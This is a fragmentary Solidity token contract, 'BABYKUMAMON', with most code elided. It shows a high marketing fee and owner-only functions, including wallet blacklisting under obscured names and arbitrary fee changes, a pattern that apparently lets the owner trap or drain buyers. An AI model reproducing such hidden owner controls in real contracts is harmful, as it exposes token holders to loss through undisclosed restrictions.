...
/**
Telegram : https://t.me/Baby_Kumamon
*/
...
contract BABYKUMAMON  is Context, IERC20, Ownable {
    ...
    string private constant _symbol = unicode"BBKUMAMON"; //    
    uint8 private constant _decimals = 9; // 
    
    
    uint256 public _marketingFee = 19;
    uint256 public _liquidityFee = 1;
    address private  _marketingWallet = 0x0b07e6c9Fc90167C82581FcF5C1aB5998e9900Be;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    function Feesprotions(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {
    ...
    function viwapp(address account) public onlyOwner {
...
/*
    ...
    */
    ...
    function Dasadlock(address[] calldata addresses) external onlyOwner {
 ...
 // Blacklist - block wallets (REMOVE - COMMA SEPARATE MULTIPLE WALLETS)
    function unlockdasad(address[] calldata addresses) external onlyOwner {
 ...
 /*
    ...
    */
    ...
    // Set the maximum wallet holding (percent of total supply)
     function set_MaxWallet(uint256 maxWallPercent_x100) external onlyOwner() {
